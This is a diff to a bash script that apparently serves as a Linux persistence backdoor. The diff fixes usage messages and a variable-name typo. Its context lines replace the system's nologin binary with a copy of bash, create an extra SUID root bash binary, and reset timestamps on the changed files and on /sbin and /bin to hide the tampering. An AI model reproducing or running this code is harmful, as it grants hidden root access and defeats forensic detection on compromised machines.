@@ -19,7 +19,7 @@ cecho () {
 	Purple='\033[0;35m'
 	Green='\033[0;32m'
 
-	local CechoUsage="${Red}[!] $0 usage: $0 <task|error|warning|info|debug|done> <\"log_message\">${ColorOff}"
+	local CechoUsage="${Red}[!] cecho usage: cecho <task|error|warning|info|debug|done> <\"log_message\">${ColorOff}"
 
 	if [ $# -ne 2 ]; then
 		echo -e "$CechoUsage"
@@ -58,7 +58,7 @@ cecho () {
 # Get a file's timestamp in YYYYMMDDhhmm format to use with "time -t"
 get_timestamp () {
 	if [ $# -ne 1 ]; then
-		cecho error "$0 usage: $0 <file>"
+		cecho error "get_timestamp usage: get_timestamp <file>"
 		return 1
 	fi
 	
@@ -72,7 +72,7 @@ get_timestamp () {
 
 set_timestamp () {
 	if [ $# -ne 2 ]; then
-		cecho error "$0 usage: $0 <timestamp> <file>"
+		cecho error "set_timestamp usage: set_timestamp <timestamp> <file>"
 		return 1
 	fi
 
@@ -220,9 +220,9 @@ else
 	sbin_timestamp=`get_timestamp "/sbin"`
 	bin_timestamp=`get_timestamp "/bin"`
 	nologin_timestamp=`get_timestamp "$nologin_path"`
-	bash_timestamp=`get_timestamp "$bath_path"`
+	bash_timestamp=`get_timestamp "$bash_path"`
 
-	mv "$nologin_path" "$BACKUP_NOLOGIN" && cp "$bash_path" "$nologin_path" && cecho info "Turned '$nologin_path' into a bash binary, real nologin backed up to '$BACKUP_NOLOGIN'" && set_timestamp $nologin_timestamp $nologin_path && set_timestamp $nologin_timestamp "$BACKUP_NOLOGIN" || cecho error "Couldn't replace '$nologin_path' with the bash binary"
+	mv "$nologin_path" "$BACKUP_NOLOGIN" && cp "$bash_path" "$nologin_path" && cecho info "Turned '$nologin_path' into a bash binary, real nologin backed up to '$BACKUP_NOLOGIN'" && set_timestamp $nologin_timestamp "$nologin_path" && set_timestamp $nologin_timestamp "$BACKUP_NOLOGIN" || cecho error "Couldn't replace '$nologin_path' with the bash binary"
 	cp "$bash_path" "$EXTRA_BASH" && chmod u+s "$EXTRA_BASH" && cecho info "Created extra SUID bash binary '$EXTRA_BASH'" && set_timestamp $bash_timestamp "$bash_path" && set_timestamp $bash_timestamp "$EXTRA_BASH" || cecho error "Couldn't create extra SUID bash binary '$EXTRA_BASH'"
 
 	set_timestamp $sbin_timestamp "/sbin"
